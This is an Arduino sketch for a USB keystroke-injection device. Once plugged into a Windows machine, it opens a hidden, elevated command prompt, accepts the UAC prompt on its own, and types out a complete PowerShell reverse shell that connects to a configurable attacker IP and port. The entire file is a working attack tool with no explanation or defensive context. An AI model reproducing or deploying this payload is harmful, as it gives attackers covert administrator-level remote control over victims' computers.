void setup() {
  // put your setup code here, to run once:
  //reverse_shell via cmd(local)
  delay(5000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();
  delay(500);

  Keyboard.print("cmd.exe /T:01 /K mode CON: COLS=16 LINES=1");
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(2500);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();
  delay(1500);
  Keyboard.println("powershell");
  delay(200);
  Keyboard.println("function cleanup {");
  Keyboard.println("if ($client.Connected -eq $true) {$client.Close()}");
  Keyboard.println("if ($process.ExitCode -ne $null) {$process.Close()}");
  Keyboard.println("exit}");
  // Setup 192.168.202.130 HERE
  Keyboard.println("$address = '192.168.1.8'");
  // Setup PORT HERE
  Keyboard.println("$port = '8000'");
  Keyboard.println("$client = New-Object system.net.sockets.tcpclient");
  Keyboard.println("$client.connect($address,$port)");
  Keyboard.println("$stream = $client.GetStream()");
  Keyboard.println("$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize");
  Keyboard.println("$process = New-Object System.Diagnostics.Process");
  Keyboard.println("$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'");
  Keyboard.println("$process.StartInfo.RedirectStandardInput = 1");
  Keyboard.println("$process.StartInfo.RedirectStandardOutput = 1");
  Keyboard.println("$process.StartInfo.UseShellExecute = 0");
  Keyboard.println("$process.Start()");
  Keyboard.println("$inputstream = $process.StandardInput");
  Keyboard.println("$outputstream = $process.StandardOutput");
  Keyboard.println("Start-Sleep 1");
  Keyboard.println("$encoding = new-object System.Text.AsciiEncoding");
  Keyboard.println("while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())}");
  Keyboard.println("$stream.Write($encoding.GetBytes($out),0,$out.Length)");
  Keyboard.println("$out = $null; $done = $false; $testing = 0;");
  Keyboard.println("while (-not $done) {");
  Keyboard.println("if ($client.Connected -ne $true) {cleanup}");
  Keyboard.println("$pos = 0; $i = 1");
  Keyboard.println("while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {");
  Keyboard.println("$read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)");
  Keyboard.println("$pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}");
  Keyboard.println("if ($pos -gt 0) {");
  Keyboard.println("$string = $encoding.GetString($networkbuffer,0,$pos)");
  Keyboard.println("$inputstream.write($string)");
  Keyboard.println("start-sleep 1");
  Keyboard.println("if ($process.ExitCode -ne $null) {cleanup}");
  Keyboard.println("else {");
  Keyboard.println("$out = $encoding.GetString($outputstream.Read())");
  Keyboard.println("while($outputstream.Peek() -ne -1){");
  Keyboard.println("$out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}}");
  Keyboard.println("$stream.Write($encoding.GetBytes($out),0,$out.length)");
  Keyboard.println("$out = $null");
  Keyboard.println("$string = $null}} else {cleanup}}");
  Keyboard.println(""); //Enter to start execution

}

void loop() {
  // put your main code here, to run repeatedly:

}
